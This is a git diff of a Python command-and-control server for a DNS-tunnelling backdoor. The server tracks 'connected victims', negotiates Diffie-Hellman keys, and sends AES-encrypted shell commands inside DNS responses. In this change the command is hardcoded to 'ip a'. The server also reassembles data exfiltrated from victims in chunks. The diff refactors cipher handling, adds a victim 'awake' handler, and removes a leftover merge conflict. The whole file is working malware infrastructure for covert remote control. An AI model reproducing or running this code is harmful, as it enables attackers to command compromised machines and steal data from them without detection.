@@ -24,10 +24,20 @@ SERVER_COMMANDS = {'keyExchange2': 102, 'ok&process': 200, 'ok&sleep': 301, 'err
                    'more': 501, 'next': 502, 'last': 503, 'ok&continue': 504}
 stat_data = b''
 stat_code = 0
-connected_victims = {}  # keys: identifies victims' numbers,
-# values: to each: [shared key, encrypting object, decrypting object, os type]
+connected_victims = {}  # keys: identifies victims' numbers. values: to each: [shared key, os type]
 need_2_send: List[bytes] = []
 input_buffer = ""
+
+
+def cipher_obj(key: bytes):
+    """
+    Creating an AES cipher block for encrypting & decrypting.
+    The cipher object is working only once - so we recreating it every encrypting/decrypting.
+
+    :param key: the encrypting-decrypting shared key.
+    :returns: AES cipher block for encrypting/decrypting.
+    """
+    return AES.new(key[:32], AES.MODE_CBC, iv=key[33:49])
 
 
 def listen_socket():
@@ -69,8 +79,8 @@ def attack(request: DNSQR):
         print('more')
         get_first_part(request, identify, enc_data)
 
-    elif cmd_code == CLIENT_COMMANDS['more']:
-        print('more')
+    elif cmd_code == CLIENT_COMMANDS['next']:
+        print('next')
         get_next_part(request, identify, enc_data)
 
     elif cmd_code == CLIENT_COMMANDS['last']:
@@ -85,6 +95,7 @@ def attack(request: DNSQR):
         else:
             print('last part')
             try:
+                print('[!] stat_data + enc_data:\n', stat_data + enc_data)
                 data = decode_msg(identify, stat_data + enc_data)
             except binascii.Error:
                 err_ans = build_response(identify, SERVER_COMMANDS['error&retransmission'], b'wrong code - no last')
@@ -106,6 +117,10 @@ def attack(request: DNSQR):
         # send the other parts of the data, if the victim says that he is ready to accept it,
         # and if we have something more to send
         send_next_part(request, identify)
+
+    elif cmd_code == CLIENT_COMMANDS['awake']:
+        print('victim awake')
+        send_next_command(request, identify)
 
 
 # region protocol parts functions
@@ -185,13 +200,10 @@ def key_exchange1(request: DNSQR, identify: bytes, bytes_victim_dh_pubkey: bytes
     pubkey: int = dh.gen_public_key()
     shared_key: bytes = dh.gen_shared_key(victim_dh_pubkey).encode()
 
-    encrypting = AES.new(shared_key[:32], AES.MODE_CBC, iv=shared_key[33:49])
-    decrypting = AES.new(shared_key[:32], AES.MODE_CBC, iv=shared_key[33:49])
-
     server_pubkey_response = build_response(identify, SERVER_COMMANDS['keyExchange2'], pubkey.to_bytes(256, 'little'))
     send_response(request, server_pubkey_response)
 
-    connected_victims[identify] = [shared_key, encrypting, decrypting]
+    connected_victims[identify] = [shared_key]
 
 
 def key_exchange3(request: DNSQR, identify: bytes, enc_victim_os: bytes):
@@ -208,30 +220,30 @@ def key_exchange3(request: DNSQR, identify: bytes, enc_victim_os: bytes):
     connected_victims[identify].append(victim_os)
     print("[!] New victim is connected!")
 
-    curr_vic = connected_victims[identify]
-    print(f"[!] {identify} OS type: {curr_vic[-1]}")
+    print(f"[!] {identify} OS type: {connected_victims[identify][-1]}")
     send_next_command(request, identify)
 
 
+# endregion
+
 def send_next_command(request: DNSQR, identify: bytes):
     """
-
     :param request: the DNSQR paket from victim
     :param identify: victim identify number
     """
-    global input_buffer
-
-    if input_buffer != '':
-        response_data = build_response(identify, SERVER_COMMANDS['ok&process'], input_buffer.encode())
-        input_buffer = ''
-    else:
-        print("[!]send him to sleep!")
-        response_data = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'5')
+    # global input_buffer
+    #
+    # if input_buffer != '':
+    #     response_data = build_response(identify, SERVER_COMMANDS['ok&process'], input_buffer.encode())
+    #     input_buffer = ''
+    # else:
+    #     print("[!]send him to sleep!")
+    #     response_data = build_response(identify, SERVER_COMMANDS['ok&sleep'], b'5')
+    # send_response(request, response_data)
+    print('send `ip a`')
+    response_data = build_response(identify, SERVER_COMMANDS['ok&process'], b'ip a')
     send_response(request, response_data)
 
-
-
-# endregion
 
 # endregion
 
@@ -246,12 +258,14 @@ def build_response(identify: bytes, cmd_code: int, cmd: bytes):
     :param cmd: the next command.
     :return: an encrypted answer, encoded in base 32
     """
-    if identify in connected_victims and 0 <= 1 < len(connected_victims[identify]):
+    if identify in connected_victims:
         # we encrypt the msg iff we already exchanged the key and we have the decrypting object
-        encrypted_msg = connected_victims[identify][1].encrypt(pad(cmd, AES.block_size))
+        aes_encrypting = cipher_obj(connected_victims[identify][0])
+        encrypted_msg = aes_encrypting.encrypt(pad(cmd, AES.block_size))
         base32_msg = base64.b32encode(encrypted_msg)
     else:
         base32_msg = base64.b32encode(cmd)
+    # base32_msg = base64.b32encode(cmd)
 
     # check if the length of the message is more than 63 allowed chars between 2 dots:
     max_chars = MAX_CHARS_IN_SUBDOMAIN
@@ -393,32 +407,18 @@ def decode_msg(identify, encrypted_msg: bytes) -> str:
     """
 
     base32_msg = base64.b32decode(encrypted_msg)  # decode the response
-
-    if identify in connected_victims and 0 <= 2 < len(connected_victims[identify]):
+    print(identify, connected_victims[identify])
+    if identify in connected_victims:
         # we decrypt the msg iff we already exchanged the key and we have the decrypting object
-        return unpad(connected_victims[identify][2].decrypt(base32_msg), AES.block_size).decode()
+        decrypting = cipher_obj(connected_victims[identify][0])
+        return unpad(decrypting.decrypt(base32_msg), AES.block_size).decode()
     else:
         return base32_msg.decode()
 
 
 def main():
-    global input_buffer
-    t1 = Thread(target=run)
-    t1.start()
-    while True:
-        if connected_victims:
-            input_buffer = input("enter the next command to perform:")
+    run()
 
 
 if __name__ == "__main__":
-<<<<<<< HEAD
     main()
-=======
-    t1 = Thread(target=run)
-    t1.start()
-    while(True):
-        with mutex:
-            input_buffer = raw_input();
-            mutex.acquire()
-        input_buffer = ""
->>>>>>> 3d18940f789202eee1f4f6056c5449242ecc47d2
